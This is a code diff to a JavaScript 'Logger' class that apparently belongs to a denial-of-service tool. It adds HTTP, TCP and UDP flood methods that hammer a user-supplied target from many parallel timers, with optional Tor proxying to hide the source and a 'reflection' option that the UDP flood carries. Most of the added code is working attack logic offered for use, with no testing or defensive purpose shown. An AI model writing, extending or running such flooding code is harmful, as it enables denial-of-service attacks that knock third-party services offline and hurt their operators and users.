@@ -9,6 +9,7 @@ const os = require('os');
 const tcpp = require('tcp-ping');
 const net = require('net');
 const tls = require('tls');
+const url = require('url');
 
 class Logger {
     constructor() {
@@ -64,7 +65,9 @@ class Logger {
             attackPacketLoss: 0,
             attackReflectionEnabled: false,
             attackDuration: 0,
-            mbps: 0
+            mbps: 0,
+            attackRate: 0,
+            attackProtocol: 'TCP'
         };
         this.latencyData = [];
         this.initializeUI();
@@ -195,21 +198,32 @@ class Logger {
         URL.revokeObjectURL(url);
     }
 
-    startAttack(target, attackType, threads, torProxy, duration, reflectionEnabled = false) {
+    startAttack(target, attackType, threads, torProxy, duration, attackRate, attackProtocol, reflectionEnabled = false) {
         this.stats.attackStartTime = new Date().toISOString();
         this.stats.attackThreads = threads;
         this.stats.torProxyUsed = torProxy || 'None';
         this.stats.attackReflectionEnabled = reflectionEnabled;
         this.stats.attackDuration = duration;
-        this.updateStats(0, 0, 'Attacking', attackType, target, threads, torProxy, reflectionEnabled, 0);
+        this.stats.attackRate = attackRate;
+        this.stats.attackProtocol = attackProtocol;
+
+        this.updateStats(0, 0, 'Attacking', attackType, target, threads, torProxy, reflectionEnabled, 0, attackRate, attackProtocol);
         this.setAttackStatus('Running');
-        this.setAttackDetails(`Attack type: ${attackType}, threads: ${threads}, reflection: ${reflectionEnabled}, duration: ${duration} seconds`);
+        this.setAttackDetails(`Attack type: ${attackType}, threads: ${threads}, reflection: ${reflectionEnabled}, duration: ${duration} seconds, rate: ${attackRate}, protocol: ${attackProtocol}`);
         this.setAttackProgress(0);
         this.setAttackErrorDetails('None');
 
         this.attackTimeout = setTimeout(() => {
             this.endAttack();
         }, duration * 1000);
+
+        if (attackType === 'HTTP Flood') {
+            this.httpFlood(target, threads, duration, attackRate, torProxy);
+        } else if (attackType === 'TCP Flood') {
+            this.tcpFlood(target, threads, duration, attackRate, torProxy);
+        } else if (attackType === 'UDP Flood') {
+            this.udpFlood(target, threads, duration, attackRate, reflectionEnabled, torProxy);
+        }
     }
 
     endAttack() {
@@ -219,13 +233,13 @@ class Logger {
         const endTime = new Date(this.stats.attackEndTime).getTime();
         this.stats.totalAttackTime = (endTime - startTime) / 1000;
 
-        this.updateStats(this.stats.packetsSent, this.stats.bytesSent, 'Idle', 'None', 'None', 0, 'None', false, 0);
+        this.updateStats(this.stats.packetsSent, this.stats.bytesSent, 'Idle', 'None', 'None', 0, 'None', false, 0, 0, 'TCP');
         this.setAttackStatus('Stopped');
         this.setAttackDetails(`Attack finished in ${this.stats.totalAttackTime} seconds`);
         this.setAttackProgress(100);
     }
 
-    updateStats(packets, bytes, status, attackType, target, threads, torProxy, reflectionEnabled = false, mbps = 0) {
+    updateStats(packets, bytes, status, attackType, target, threads, torProxy, reflectionEnabled = false, mbps = 0, attackRate = 0, attackProtocol = 'TCP') {
         this.stats.packetsSent += packets;
         this.stats.bytesSent += bytes;
         this.stats.connectionStatus = status;
@@ -235,6 +249,8 @@ class Logger {
         this.stats.torProxyUsed = torProxy || this.stats.torProxyUsed;
         this.stats.attackReflectionEnabled = reflectionEnabled;
         this.stats.mbps = mbps;
+        this.stats.attackRate = attackRate;
+        this.stats.attackProtocol = attackProtocol;
         this.displayStats();
     }
 
@@ -459,6 +475,8 @@ class Logger {
         document.getElementById('attack-packet-loss').textContent = this.stats.attackPacketLoss.toFixed(2) + '%';
         document.getElementById('attack-reflection-enabled').textContent = this.stats.attackReflectionEnabled ? 'Yes' : 'No';
         document.getElementById('mbps').textContent = this.stats.mbps.toFixed(2);
+        document.getElementById('attack-rate').textContent = this.stats.attackRate.toFixed(2);
+        document.getElementById('attack-protocol').textContent = this.stats.attackProtocol;
     }
 
     getStats() {
@@ -561,6 +579,14 @@ class Logger {
         this.stats.mbps = mbps;
         this.displayStats();
     }
+    setAttackRate(attackRate) {
+        this.stats.attackRate = attackRate;
+        this.displayStats();
+    }
+    setAttackProtocol(attackProtocol) {
+        this.stats.attackProtocol = attackProtocol;
+        this.displayStats();
+    }
 
     initializeUI() {
         document.getElementById('clear-logs-button').addEventListener('click', () => {
@@ -570,6 +596,151 @@ class Logger {
         document.getElementById('download-logs-button').addEventListener('click', () => {
             this.downloadLogs();
         });
+    }
+
+    //ATTACKS
+
+    async httpFlood(target, threads, duration, attackRate, torProxy) {
+        if (!target.startsWith('http://') && !target.startsWith('https://')) {
+            target = 'http://' + target;
+        }
+
+        const parsedUrl = url.parse(target);
+        const host = parsedUrl.hostname;
+        const path = parsedUrl.path;
+        const isHTTPS = parsedUrl.protocol === 'https:';
+
+        const agentOptions = {};
+        if (torProxy) {
+            const proxyUrl = url.parse(torProxy);
+            agentOptions.host = proxyUrl.hostname;
+            agentOptions.port = proxyUrl.port;
+            agentOptions.path = target;
+            agentOptions.headers = {
+                Host: host
+            };
+        }
+
+        const makeRequest = () => {
+            return new Promise((resolve, reject) => {
+                const options = {
+                    hostname: host,
+                    path: path,
+                    method: 'GET',
+                    agent: torProxy ? new http.Agent(agentOptions) : undefined
+                };
+
+                const req = (isHTTPS ? https : http).request(options, (res) => {
+                    this.updateStats(0, 100, 'Attacking', 'HTTP Flood', target, threads, torProxy, false, 0, attackRate, 'HTTP');
+                    resolve();
+                });
+
+                req.on('error', (error) => {
+                    console.error(`HTTP Flood error: ${error}`);
+                    this.setAttackErrorDetails(`HTTP Flood error: ${error.message}`);
+                    this.stats.errors++;
+                    this.displayStats();
+                    reject(error);
+                });
+
+                req.end();
+                this.updateStats(1, 0, 'Attacking', 'HTTP Flood', target, threads, torProxy, false, 0, attackRate, 'HTTP');
+            });
+        };
+
+        const delay = 1000 / attackRate;
+
+        for (let i = 0; i < threads; i++) {
+            let intervalId = setInterval(async () => {
+                try {
+                    await makeRequest();
+                } catch (error) {
+                    clearInterval(intervalId);
+                }
+            }, delay);
+        }
+    }
+
+
+    async tcpFlood(target, threads, duration, attackRate, torProxy) {
+        const makeConnection = () => {
+            return new Promise((resolve, reject) => {
+                const socket = net.createConnection({
+                    host: target,
+                    port: 80 // Default port, can be changed
+                }, () => {
+                    this.updateStats(0, 50, 'Attacking', 'TCP Flood', target, threads, torProxy, false, 0, attackRate, 'TCP');
+                    resolve(socket);
+                });
+
+                socket.on('data', (data) => {
+                    this.updateStats(0, data.length, 'Attacking', 'TCP Flood', target, threads, torProxy, false, 0, attackRate, 'TCP');
+                });
+
+                socket.on('error', (error) => {
+                    console.error(`TCP Flood error: ${error}`);
+                    this.setAttackErrorDetails(`TCP Flood error: ${error.message}`);
+                    this.stats.errors++;
+                    this.displayStats();
+                    reject(error);
+                });
+
+                socket.on('close', () => {
+                    resolve(null);
+                });
+            });
+        };
+
+        const delay = 1000 / attackRate;
+
+        for (let i = 0; i < threads; i++) {
+            let intervalId = setInterval(async () => {
+                try {
+                    const socket = await makeConnection();
+                    if (socket) {
+                        // Send some data to keep the connection alive
+                        socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
+                    }
+                } catch (error) {
+                    clearInterval(intervalId);
+                }
+            }, delay);
+        }
+    }
+
+    async udpFlood(target, threads, duration, attackRate, reflectionEnabled, torProxy) {
+        const dgram = require('dgram');
+        const client = dgram.createSocket('udp4');
+        const message = Buffer.from('This is a UDP flood test message.');
+
+        const sendPacket = () => {
+            return new Promise((resolve, reject) => {
+                client.send(message, 0, message.length, 80, target, (err) => {
+                    if (err) {
+                        console.error(`UDP Flood error: ${err}`);
+                        this.setAttackErrorDetails(`UDP Flood error: ${err.message}`);
+                        this.stats.errors++;
+                        this.displayStats();
+                        reject(err);
+                    } else {
+                        this.updateStats(1, message.length, 'Attacking', 'UDP Flood', target, threads, torProxy, reflectionEnabled, 0, attackRate, 'UDP');
+                        resolve();
+                    }
+                });
+            });
+        };
+
+        const delay = 1000 / attackRate;
+
+        for (let i = 0; i < threads; i++) {
+            let intervalId = setInterval(async () => {
+                try {
+                    await sendPacket();
+                } catch (error) {
+                    clearInterval(intervalId);
+                }
+            }, delay);
+        }
     }
 }
 
